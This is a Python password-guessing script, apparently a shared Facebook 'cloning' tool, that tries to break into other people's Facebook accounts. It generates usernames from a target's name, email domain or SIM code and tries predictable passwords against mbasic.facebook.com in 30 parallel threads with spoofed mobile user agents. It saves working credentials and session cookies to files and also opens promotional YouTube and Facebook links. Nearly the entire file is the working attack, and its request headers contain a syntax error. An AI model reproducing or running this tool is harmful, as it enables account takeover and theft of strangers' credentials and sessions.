#SC MAKED BY SW4T1  🤣 and Fuked By FB-KING 🙄

#Tera pappa FB-KING 😘 MAHIN AHMED

#................♥SW4T1♥................

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup


from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' #

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android'

    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])

    c=' en-us; GT-'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Mobile Safari/537.36'

    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')

    ugen.append(uaku2)

logo = ("""\033[1;32m

         \033[1;32m ##     ##     ######      ######   
         \033[1;32m ###   ###    ##    ##    ##    ##  
         \033[1;32m #### ####    ##          ## 
         \033[1;32m ## ### ##     ######      ######
         \033[1;32m ##     ##          ##          ##
         \033[1;32m ##     ##    ##    ##    ##    ##
         \033[1;32m ##     ##     ######      ###### 
--------------------------------------------------
[•]\033[1;32mCREATED BY     : \033[1;32mAB KHANX\033[1;32m
[•]\033[1;32mFACEBOOK       : \033[1;32mAB KHANX\033[1;32m
[•]\033[1;32mYOUTUBE        : \033[1;32mMSS TRICKS\033[1;32m
[•]\033[1;32mSTATUS         : \033[1;32mFREE\033[1;32m
--------------------------------------------------
[•] \033[1;32mVERSION 2.8\033[1;32m
--------------------------------------------------""")

class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        os.system('xdg-open https://www.youtube.com/@MSSTRICKS')

        print(logo)

        print(" [1] FACEBOOK GMAIL & YAHOO CLONING")

        print(" [2] FACEBOOK USERNAME CLONING")

        print(" [3] FACEBOOK RANDOM CLONING")

        print(" [0] Exit")

        SW4T1 =input(" [√] Choose : ")

        if SW4T1 in ["1", "01"]:

            v1()

        if SW4T1 in ["2", "02"]:

            v2()

        if SW4T1 in ["3","03"]:

            v3()

        if SW4T1 in [" 0", "00"]:

            exit()

        else:

            exit()

def v1():

    user=[]

    os.system('clear')

    os.system('xdg-open https://www.youtube.com/@MSSTRICKS')

    print(logo)

    kode = input(' [💉]  target fast name : ')

    kodex = input(' [💉] target last name :  ')

    print(' [🤝] example Doamin : @gmail.com, @yahoo.com ')

    doamin = input(' [📧]  Input Doamin  : ')

    limit = int(input('[?] How many numbers do you want to add : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print(' [♥]  Total ids:\033[1;32m '+tl)

        print(f"\033[1;32m [♥]  Target Doamin:\033[1;32m {doamin}")

        print(' \033[1;32m[♥]  The process has been started')

        print(' [♥]  Wait for ids ')

        print(50*'_')

        for guru in user:

            uid = kode+kodex+guru+doamin

            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [♥] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def v2():

    user=[]

    os.system('clear')

    os.system('xdg-open https://www.youtube.com/@MSSTRICKS')

    print(logo)

    kode = input(' [💉]  target fast name example ali. khan. muhammad ')

    kodex = input(' [💉] target last name : khan. ali. awais ')

    doamin = '.'

    limit = int(input('[?] How many numbers do you want to add  example 30:000 40:000 '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        print(logo)

        tl = str(len(user))

        print(' [♥]  Total ids:\033[1;32m '+tl)

        print(f"\033[1;32m [♥]  Target Doamin:\033[1;32m Facebook CLONING (name)")

        print(' \033[1;32m[♥]  The process has been started')

        print(' [♥]  Wait for ids ')

        print(50*'_')

        for guru in user:

            uid = kode+doamin+kodex+guru

            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [♥] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def v3():

    user=[]

    os.system('clear')

    os.system('xdg-open https://www.youtube.com/@MSSTRICKS')

    print(logo)

    kode = input(' [💉] Enter sim code: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    doamin = ' Facebook CLONING (BD number) '

    limit = int(input('[?] How many numbers do you want to add : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as yaari:

        os.system('clear')

        os.system('xdg-open https://facebook.com/groups/937891393893387/ ')

        print(logo)

        tl = str(len(user))

        print(' [♥]  Total ids:\033[1;32m '+tl)

        print(f"\033[1;32m[♥]  Target Doamin:\033[1;32m {doamin}")

        print(' \033[1;32m [♥]  The process has been started')

        print(' [♥]  Wait for ids ')

        print(50*'_')

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'bangladesh']

            yaari.submit(rcrack1,uid,pwx,tl)

    print(50*'_')

    print(' [♥] Crack process has been completed')

    print(' [♥] Ids saved in ok.txt,cp.txt')

    print(50*'_')

def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\033[1;92mSW4T1\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://free.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'mbasic.facebook.com',

            'method': 'GET',
         
            'scheme': 'https',
            
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            
            'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
            
            'cache-control': 'max-age=0',
            
            'sec-ch-ua': '"(Not(A:Brand";v="99"',
            
            'sec-ch-ua-mobile': '?1',
            
            'sec-ch-ua-platform': '"Android"',
            
            'sec-fetch-dest': 'document',
            
            'sec-fetch-mode': 'navigate',
            
            'sec-fetch-site': 'none',
            
            'sec-fetch-user': '?1',
            
            'upgrade-insecure-requests': '1'

            'user-agent': 'Mozilla/5.0 (Android; Mobile; rv:113.0) Gecko/113.0 Firefox/113.0',}

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[SUCCESSFUL-💚] {uid}|{ps}")

                print(f" \n Cookie : {coki}")

                print(f" \n ══════════════════════════════════════════")

                open('/sdcard/SW4T1/ok.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"\x1b[38;5;196m[DEATH-💔] {uid}|{ps}")

                open('/sdcard/SW4T1-CP.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[m[SW4T1] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

Main()
